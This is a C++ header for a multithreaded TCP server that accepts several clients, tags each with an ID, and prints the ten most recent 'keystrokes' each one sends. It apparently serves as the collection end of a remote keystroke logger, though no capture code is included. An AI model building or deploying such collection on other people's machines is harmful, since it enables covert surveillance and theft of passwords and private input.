#ifndef SERVER_CROSS_HPP
#define SERVER_CROSS_HPP

#include "socket_utils_cross.hpp"
#include "thread_safe_queue.hpp"
#include <thread>
#include <atomic>
#include <unordered_map>
#include <mutex>
#include <vector>
#include <sstream>
#include <iostream>

class ClientHandler {
private:
    int client_socket_;
    std::atomic<bool> running_;
    std::thread handler_thread_;
    std::string client_id_;
    static std::mutex display_mutex_;

public:
    ClientHandler(int socket, const std::string& id) 
        : client_socket_(socket), running_(false), client_id_(id) {}

    ~ClientHandler() {
        stop();
    }

    void start() {
        running_ = true;
        handler_thread_ = std::thread(&ClientHandler::handleClient, this);
    }

    void stop() {
        running_ = false;
        if (handler_thread_.joinable()) {
            handler_thread_.join();
        }
        if (client_socket_ >= 0) {
            close(client_socket_);
        }
    }

    bool isRunning() const {
        return running_;
    }

    std::string getClientId() const {
        return client_id_;
    }

    void setClientId(const std::string& id) {
        client_id_ = id;
    }

private:
    void handleClient() {
        std::vector<std::string> recent_keystrokes;
        const size_t N = 10;

        std::cout << "Client " << client_id_ << " connected" << std::endl;

        while (running_) {
            std::string data = SocketUtils::receiveData(client_socket_);
            if (data.empty()) {
                break;
            }

            std::istringstream stream(data);
            std::string line;
            while (std::getline(stream, line)) {
                if (!line.empty()) {
                    // Check if it's a client ID message
                    if (line.find("CLIENT_ID: ") == 0) {
                        std::string id = line.substr(11);
                        setClientId(id);
                        std::cout << "Client identified as: " << id << std::endl;
                        continue;
                    }
                    
                    recent_keystrokes.push_back(line);
                    if (recent_keystrokes.size() > N) {
                        recent_keystrokes.erase(recent_keystrokes.begin());
                    }
                    displayRecentKeystrokes(recent_keystrokes);
                }
            }
        }

        std::cout << "Client " << client_id_ << " disconnected" << std::endl;
    }

    void displayRecentKeystrokes(const std::vector<std::string>& keystrokes) {
        std::lock_guard<std::mutex> lock(display_mutex_);
        
        std::cout << "\n=== Client: " << client_id_ << " ===" << std::endl;
        std::cout << "Recent events:" << std::endl;
        
        for (size_t i = 0; i < keystrokes.size(); ++i) {
            std::cout << "  " << (i + 1) << ". " << keystrokes[i] << std::endl;
        }
        
        if (keystrokes.empty()) {
            std::cout << "  No events received yet" << std::endl;
        }
        
        std::cout << "==================" << std::endl;
    }
};

std::mutex ClientHandler::display_mutex_;

class Server {
private:
    int port_;
    std::atomic<bool> running_;
    std::thread accept_thread_;
    std::unordered_map<std::string, std::unique_ptr<ClientHandler>> clients_;
    std::mutex clients_mutex_;
    int client_counter_;

public:
    Server(int port) : port_(port), running_(false), client_counter_(0) {}

    ~Server() {
        stop();
    }

    bool start() {
        if (running_) {
            return false;
        }

        running_ = true;
        accept_thread_ = std::thread(&Server::acceptLoop, this);

        std::cout << "Server started on port " << port_ << std::endl;
        std::cout << "Waiting for connections..." << std::endl;

        return true;
    }

    void stop() {
        running_ = false;
        
        {
            std::lock_guard<std::mutex> lock(clients_mutex_);
            for (auto& client : clients_) {
                client.second->stop();
            }
            clients_.clear();
        }

        if (accept_thread_.joinable()) {
            accept_thread_.join();
        }
        
        SocketUtils::cleanupWSA();
    }

private:
    void acceptLoop() {
        try {
            int server_socket = SocketUtils::createSocket();
            SocketUtils::bindSocket(server_socket, port_);
            SocketUtils::listenSocket(server_socket);

            while (running_) {
                int client_socket = SocketUtils::acceptConnection(server_socket);
                
                std::string client_id = "Client_" + std::to_string(++client_counter_);
                
                auto client_handler = std::make_unique<ClientHandler>(client_socket, client_id);
                client_handler->start();
                
                {
                    std::lock_guard<std::mutex> lock(clients_mutex_);
                    clients_[client_id] = std::move(client_handler);
                }

                cleanupClients();
            }

            close(server_socket);
        } catch (const std::exception& e) {
            std::cerr << "Server error: " << e.what() << std::endl;
        }
    }

    void cleanupClients() {
        std::lock_guard<std::mutex> lock(clients_mutex_);
        for (auto it = clients_.begin(); it != clients_.end();) {
            if (!it->second->isRunning()) {
                it = clients_.erase(it);
            } else {
                ++it;
            }
        }
    }
};

#endif